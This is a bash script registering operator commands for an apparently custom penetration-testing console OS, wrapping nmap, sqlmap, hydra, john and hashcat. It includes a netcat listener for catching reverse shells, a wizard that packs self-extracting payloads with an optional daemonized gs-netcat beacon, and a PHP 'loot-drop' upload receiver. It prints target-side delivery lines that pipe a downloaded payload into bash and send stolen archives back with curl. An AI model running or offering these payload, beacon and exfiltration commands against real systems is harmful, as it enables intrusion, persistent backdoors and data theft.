#!/usr/bin/env bash
#
# cobra-ops.sh — COBRA OS operator command registry.
#
# Ported from the retired Textual TUI (tui/cobra_tui.py). COBRA OS is
# console-only — no X server, no GUI packages: tmux splits/tabs are the
# dashboard and every command here is a TTY citizen. Every function maps
# 1:1 to an installed core package in chroot-setup.sh and a row in
# BUILD_PLAN.md §2.
#
# Sourced from /etc/bash.bashrc right after cobrashell.sh so every
# interactive bash shell gets these commands. The registry sync rule:
#   function in cobra-ops.sh ↔ package in chroot-setup.sh ↔ row in §2
#
# COLLISION NOTES (vs cobrashell.sh):
#   - cobrashell already defines `scan` (port scanner) and `dns` (domain
#     → IPv4 resolver). The TUI's nmap-based scanner is renamed `fscan`
#     (fast scan) and the TUI's dig-based lookup is renamed `dnsq`
#     (DNS query). Both are documented prominently below.
#   - `listen` is safe: cobrashell overrides `nc` but does not define a
#     `listen` function.
#
# VENDORED TOOLS (2026-08-16, mined from THC's tips repo — credits in the
# vendored files; the upstream repo dir was deleted after mining):
#   egg    -> /etc/cobra/mkegg.sh (self-extracting payload packer; tar/gzip
#             are base system — no extra packages)
#   upserv -> /etc/cobra/upload_server.php (loot-drop receiver; needs
#             php-cli — ships in the webplus profile only)
#   privesc -> /etc/cobra/linpeas.sh (vendored 2026-08-17 from PEASS-ng
#             releases — NOT the THC repo; run LOCALLY, no network)
#
# $TARGET — per-shell state (like the TUI's reactive target).
#   target <host>    sets $TARGET
#   all recon functions fall back to $TARGET if no arg given

# --- Wordlists (installed by chroot-setup.sh) --------------------------
_COBRA_DIR_WORDLIST="/usr/share/wordlists/dirb/common.txt"
_COBRA_PASS_WORDLIST="/usr/share/wordlists/rockyou.txt"

# --- Target context ----------------------------------------------------
TARGET="${TARGET:-}"

target() {
    if [[ $# -lt 1 ]]; then
        if [[ -n "$TARGET" ]]; then
            echo -e "\033[1;32mTARGET\033[0m: $TARGET"
        else
            echo -e "\033[0;33mno target set\033[0m — usage: target <host>" >&2
        fi
        return
    fi
    TARGET="$1"
    echo -e "\033[1;32mTARGET → $TARGET\033[0m"
}

# --- Help --------------------------------------------------------------
opshelp() {
    cat <<'HELP'
COBRA operator commands (cobra-ops)
  target <host>             set the active target (fallback for recon cmds)
  stop                      (legacy — not needed; Ctrl+C kills the tool)

Recon (nmap) — use `fscan`/`dnsq` to avoid cobrashell collisions:
  fscan <target>            fast nmap scan (top 1000 ports, -T4 -F)
  portscan <target>         full TCP scan (-p-)
  svcscan <target>          service/version + default scripts (-sV -sC)
  vulnscan <target>         nmap vuln scripts (slow, noisy)
  udpscan <target>          top 100 UDP ports (needs sudo)
  dnsq <domain>             DNS record lookup (dig +noall +answer)
  whois <domain>            whois lookup
  smbenum <target>          enum4linux-ng -A (SMB/Windows shares, users, policy)

Web:
  webdir <url> [wordlist]   gobuster dir brute-force (default: dirb common.txt)
  webvuln <url>             nikto web server scan
  sql <url>                 sqlmap (batch, --random-agent)

Creds:
  brute <host> <svc> <user> hydra w/ rockyou (-t 4 -f -V)
  crack <hashfile>          john + rockyou
  hashcrack <mode> <hashfile>  hashcat -m <mode> + rockyou (--potfile-disable)

Exploit lookup / local privesc (both offline — no network):
  sploit <term> [...]       searchsploit — local exploit-db search
  privesc [linpeas flags]   linpeas on THIS box — local privesc paths

Capture / listeners (run each in its own tmux pane — Ctrl+C to stop):
  sniff [iface] [filter]    tcpdump live capture (sudo, -nn -l)
  pcap [iface]              tshark live decode (sudo, -l)
  listen <port>             nc -lvnp (catch reverse shells)
  serve [port]              python3 -m http.server (payload hosting)

Payload & exfil:
  egg                       wizard: pack payloads into a self-extracting egg
  egg <out> <f..> <cmd>     non-interactive: straight mkegg.sh passthrough
  upserv                    wizard: PHP upload server for loot drops (webplus)
  upserv <bind> <port> <dir>  non-interactive

Dashboards (console-only — there is no X server on COBRA):
  mon                       btop (system monitor)
  files                     nnn (console file manager)
  web [url]                 links2 text browser (xint-gated; loopback is open)
                            over Tor: xint, then torify links2 <url>

HELP
}

# --- Recon -------------------------------------------------------------
fscan() {
    local t="${1:-$TARGET}"
    [[ -z "$t" ]] && { echo -e "\033[0;31musage: fscan <target>\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ nmap -T4 -F $t\033[0m"
    nmap -T4 -F "$t"
}

portscan() {
    local t="${1:-$TARGET}"
    [[ -z "$t" ]] && { echo -e "\033[0;31musage: portscan <target>\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ nmap -p- -T4 $t\033[0m"
    nmap -p- -T4 "$t"
}

svcscan() {
    local t="${1:-$TARGET}"
    [[ -z "$t" ]] && { echo -e "\033[0;31musage: svcscan <target>\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ nmap -sV -sC -T4 $t\033[0m"
    nmap -sV -sC -T4 "$t"
}

vulnscan() {
    local t="${1:-$TARGET}"
    [[ -z "$t" ]] && { echo -e "\033[0;31musage: vulnscan <target>\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ nmap --script vuln -T4 $t\033[0m"
    nmap --script vuln -T4 "$t"
}

udpscan() {
    local t="${1:-$TARGET}"
    [[ -z "$t" ]] && { echo -e "\033[0;31musage: udpscan <target>\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ sudo nmap -sU --top-ports 100 -T4 $t\033[0m"
    sudo nmap -sU --top-ports 100 -T4 "$t"
}

whois() {
    local t="${1:-$TARGET}"
    [[ -z "$t" ]] && { echo -e "\033[0;31musage: whois <domain>\033[0m" >&2; return 1; }
    command whois "$t"
}

dnsq() {
    local t="${1:-$TARGET}"
    [[ -z "$t" ]] && { echo -e "\033[0;31musage: dnsq <domain>\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ dig $t +noall +answer\033[0m"
    dig "$t" +noall +answer
}

smbenum() {
    local t="${1:-$TARGET}"
    [[ -z "$t" ]] && { echo -e "\033[0;31musage: smbenum <target>\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ enum4linux-ng -A $t\033[0m"
    enum4linux-ng -A "$t"
}

# --- Web ---------------------------------------------------------------
webdir() {
    local url="$1" wl="${2:-$_COBRA_DIR_WORDLIST}"
    [[ -z "$url" ]] && { echo -e "\033[0;31musage: webdir <url> [wordlist]\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ gobuster dir -u $url -w $wl -q -e\033[0m"
    gobuster dir -u "$url" -w "$wl" -q -e
}

webvuln() {
    local t="${1:-$TARGET}"
    [[ -z "$t" ]] && { echo -e "\033[0;31musage: webvuln <url-or-host>\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ nikto -h $t\033[0m"
    nikto -h "$t"
}

sql() {
    local url="${1:-$TARGET}"
    [[ -z "$url" ]] && { echo -e "\033[0;31musage: sql <url>\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ sqlmap -u $url --batch --random-agent\033[0m"
    sqlmap -u "$url" --batch --random-agent
}

# --- Creds -------------------------------------------------------------
brute() {
    local host="$1" svc="$2" user="$3"
    [[ $# -lt 3 ]] && { echo -e "\033[0;31musage: brute <host> <service> <user>\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ hydra -l $user -P $_COBRA_PASS_WORDLIST -t 4 -f -V $host $svc\033[0m"
    hydra -l "$user" -P "$_COBRA_PASS_WORDLIST" -t 4 -f -V "$host" "$svc"
}

crack() {
    local hf="$1"
    [[ -z "$hf" ]] && { echo -e "\033[0;31musage: crack <hashfile>\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ john --wordlist=$_COBRA_PASS_WORDLIST $hf\033[0m"
    john "--wordlist=$_COBRA_PASS_WORDLIST" "$hf"
}

hashcrack() {
    local mode="$1" hf="$2"
    [[ $# -lt 2 ]] && { echo -e "\033[0;31musage: hashcrack <mode> <hashfile>\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ hashcat -m $mode $hf $_COBRA_PASS_WORDLIST --potfile-disable\033[0m"
    hashcat -m "$mode" "$hf" "$_COBRA_PASS_WORDLIST" --potfile-disable
}

# --- Exploit lookup / local privesc --------------------------------------
# sploit — offline exploit-db search. The exploitdb package ships the CSV
# on disk (/usr/share/exploitdb) — plain searches never touch the network.
# (`searchsploit -u` self-updates over the internet: xint first, and it
# needs git — not in the image by default.)
sploit() {
    [[ $# -lt 1 ]] && { echo -e "\033[0;31musage: sploit <term> [more terms / searchsploit flags]\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ searchsploit $*\033[0m"
    searchsploit "$@"
}

# privesc — enumerate THIS box's own privilege-escalation paths with the
# vendored linpeas. Local only: no network, no remote sourcing. Distinct
# from cobrashell's lpe(), which downloads AND executes PEAS code on a
# TARGET — never run that one here. Output is long; `privesc | tee out.txt`
# lands it in loot (XHOME is RAM — gone on reboot).
privesc() {
    local lp=/etc/cobra/linpeas.sh
    [[ -x "$lp" ]] || { echo -e "\033[0;31m[privesc] $lp missing — image predates the vendored linpeas?\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ $lp $*\033[0m  # local enumeration — no network"
    "$lp" "$@"
}

# --- Capture / listeners -----------------------------------------------
sniff() {
    local iface="${1:-any}"
    shift || true
    echo -e "\033[1;36m$ sudo tcpdump -i $iface -nn -l $*\033[0m"
    sudo tcpdump -i "$iface" -nn -l "$@"
}

pcap() {
    local iface="${1:-any}"
    echo -e "\033[1;36m$ sudo tshark -i $iface -l\033[0m"
    sudo tshark -i "$iface" -l
}

listen() {
    local port="$1"
    [[ -z "$port" ]] && { echo -e "\033[0;31musage: listen <port>\033[0m" >&2; return 1; }
    echo -e "\033[1;36m$ nc -lvnp $port\033[0m"
    nc -lvnp "$port"
}

serve() {
    local port="${1:-8000}"
    echo -e "\033[1;36m$ python3 -m http.server $port\033[0m"
    python3 -m http.server "$port"
}

# --- Payload & exfil -----------------------------------------------------
# egg — wizard around the vendored /etc/cobra/mkegg.sh (THC). Packs
# binaries/dirs/scripts into one self-extracting shell archive that unpacks
# to .tmp_egg, runs a command/script, and cleans up after itself. With
# arguments: straight mkegg.sh passthrough (scriptable).
egg() {
    local mk=/etc/cobra/mkegg.sh
    [[ -x "$mk" ]] || { echo -e "\033[0;31m[egg] $mk missing — image predates the egg tool?\033[0m" >&2; return 1; }
    if [[ $# -gt 0 ]]; then
        echo -e "\033[1;36m$ mkegg.sh $*\033[0m"
        "$mk" "$@"
        return
    fi
    echo -e "\033[1;35m[egg] payload packer — self-extracting archive + autorun\033[0m"
    local out
    read -e -r -p "output egg [egg.sh]: " out
    out="${out:-egg.sh}"
    local -a files=()
    local f
    while :; do
        read -e -r -p "add file/dir (empty when done): " f
        [[ -z "$f" ]] && break
        if [[ ! -e "$f" ]]; then
            echo -e "\033[0;33m  not found: $f\033[0m" >&2
            continue
        fi
        files+=("$f")
    done
    [[ ${#files[@]} -eq 0 ]] && { echo -e "\033[0;31m[egg] no payloads — aborting\033[0m" >&2; return 1; }
    echo -e "\033[1;35mrun mode:\033[0m"
    echo "  1) run a script from the bundle"
    echo "  2) custom command line"
    echo "  3) gs-netcat beacon (daemonized, -ilq)"
    local mode
    read -r -p "choose [1]: " mode
    mode="${mode:-1}"
    local cmd
    case "$mode" in
        1)
            local i
            for i in "${!files[@]}"; do echo "  $((i+1))) ${files[$i]}"; done
            read -r -p "run script [1]: " i
            i="${i:-1}"
            [[ "$i" =~ ^[0-9]+$ ]] || i=1
            cmd="${files[$((i-1))]:-}"
            [[ -n "$cmd" && -f "$cmd" ]] || { echo -e "\033[0;31m[egg] run script must be a file in the bundle\033[0m" >&2; return 1; }
            ;;
        2)
            read -e -r -p "command (runs in .tmp_egg, e.g. ( FOOBAR=HI ./foo; )): " cmd
            [[ -n "$cmd" ]] || { echo -e "\033[0;31m[egg] empty command — aborting\033[0m" >&2; return 1; }
            ;;
        3)
            local sec sin
            sec="$(head -c 12 /dev/urandom | od -An -tx1 | tr -d ' \n')"
            read -r -p "gsocket secret [$sec]: " sin
            sec="${sin:-$sec}"
            local genv=""
            [[ -n "${GS_HOST:-}" ]] && genv+="GS_HOST=$GS_HOST "
            [[ -n "${GS_PORT:-}" ]] && genv+="GS_PORT=$GS_PORT "
            cmd="(${genv}GS_ARGS=\"-s $sec -ilq\" gs-netcat 2>/dev/null &)"
            local has_gs=1
            for f in "${files[@]}"; do [[ "$(basename "$f")" == gs-netcat ]] && has_gs=0; done
            [[ $has_gs -ne 0 ]] && echo -e "\033[0;33m[egg] warning: gs-netcat is not in the payload list\033[0m" >&2
            ;;
        *)
            echo -e "\033[0;31m[egg] unknown mode: $mode\033[0m" >&2; return 1
            ;;
    esac
    echo -e "\033[1;35m[egg] summary\033[0m"
    echo "  out:  $out"
    echo "  pack: ${files[*]}"
    echo "  run:  $cmd"
    local go
    read -r -p "build? [Y/n]: " go
    [[ "${go:-Y}" =~ ^[Nn] ]] && { echo "aborted"; return 1; }
    echo -e "\033[1;36m$ mkegg.sh $out ${files[*]} $cmd\033[0m"
    "$mk" "$out" "${files[@]}" "$cmd" || return
    echo -e "\033[1;32m[egg] built: $out\033[0m"
    cat <<EOF
delivery:
  host it:   serve 8000        # its own tmux pane, from this directory
  on target: curl -fsSL http://<this-box>:8000/$out | bash
             bash -c "\$(curl -fsSL http://<this-box>:8000/$out)"
             chmod +x $out && ./$out
note: remote targets fetching the egg are INBOUND to this box — punch an
input hole first: sudo nft add rule inet filter input tcp dport 8000 accept
EOF
}

# upserv — wizard for the vendored THC upload_server.php: a loot-drop
# receiver targets can curl -F files to. php-cli ships in the webplus
# profile only — degrade gracefully on core-only builds.
upserv() {
    if ! command -v php >/dev/null 2>&1; then
        echo -e "\033[0;31m[upserv] php-cli not found — rebuild with COBRA_PROFILES=\"webplus\"\033[0m" >&2
        return 1
    fi
    local php=/etc/cobra/upload_server.php
    [[ -f "$php" ]] || { echo -e "\033[0;31m[upserv] $php missing\033[0m" >&2; return 1; }
    local bind port udir
    if [[ $# -ge 3 ]]; then
        bind="$1"; port="$2"; udir="$3"
    else
        echo -e "\033[1;35m[upserv] loot-drop receiver (PHP upload server)\033[0m"
        read -e -r -p "bind address [127.0.0.1]: " bind
        bind="${bind:-127.0.0.1}"
        read -e -r -p "port [8080]: " port
        port="${port:-8080}"
        read -e -r -p "upload dir [./uploads]: " udir
        udir="${udir:-./uploads}"
    fi
    mkdir -p "$udir" || return 1
    # Off-loopback binds are INBOUND connections — the default-deny nftables
    # policy would drop them. Offer a runtime input hole (gone on reboot).
    if [[ "$bind" != 127.* && "$bind" != "localhost" && "$bind" != "::1" ]]; then
        local fw
        read -r -p "add nftables input rule for tcp/$port? [Y/n]: " fw
        if [[ ! "${fw:-Y}" =~ ^[Nn] ]]; then
            sudo nft add rule inet filter input tcp dport "$port" accept
            echo -e "\033[0;33m[upserv] runtime rule only — gone on reboot. Remove by hand: sudo nft -a list chain inet filter input, then delete by handle.\033[0m"
        fi
    fi
    local bhost="$bind"
    [[ "$bhost" == "0.0.0.0" || "$bhost" == "::" ]] && bhost="127.0.0.1"
    cat <<EOF
target-side upload (use this box's address from the target):
  curl -fsSL -F "file=@loot.tar.gz" http://$bind:$port/
browse received loot (loopback — no xint needed):
  links2 http://$bhost:$port/
EOF
    echo -e "\033[1;36m$ (cd $udir && php -S $bind:$port $php)\033[0m  # Ctrl+C stops"
    (cd "$udir" && php -S "$bind:$port" "$php")
}

# --- Dashboards --------------------------------------------------------
mon() {
    if command -v btop >/dev/null 2>&1; then
        btop
    else
        echo -e "\033[0;33m[mon] btop not found — install it or check PATH\033[0m" >&2
        return 1
    fi
}

files() {
    if command -v nnn >/dev/null 2>&1; then
        nnn
    else
        echo -e "\033[0;33m[files] nnn not found — install it or check PATH\033[0m" >&2
        return 1
    fi
}

web() {
    # Console-only browser (links2). Enforces cobrashell's xint gate — the
    # same deliberate-internet philosophy as transfer/tb. For anonymous
    # research over the system tor daemon: `xint` then `torify links2 <url>`
    # (torsocks wraps the links2 binary directly — it cannot wrap functions).
    # Loopback URLs (local listeners like upserv) bypass the gate — they
    # never leave the box. Everything off-box still requires xint.
    local url="${1:-}"
    if [[ ! "$url" =~ ^(https?://)?(localhost|127\.[0-9.]+|\[?::1\]?)(:[0-9]+)?(/|$) ]] \
        && declare -F _hs_internet_allowed >/dev/null 2>&1; then
        _hs_internet_allowed || return 255
    fi
    if ! command -v links2 >/dev/null 2>&1; then
        echo -e "\033[0;31m[web] links2 not found — it is part of the core toolset\033[0m" >&2
        return 1
    fi
    echo -e "\033[0;33m[web] links2 — deliberate internet use (tor: torify links2 <url>)\033[0m"
    links2 "$@"
}

# --- stop (legacy — kept for muscle memory; Ctrl+C is the real way) ----
stop() {
    echo -e "\033[0;33m[stop] long-running tools run in their own tmux pane — use Ctrl+C there\033[0m"
}
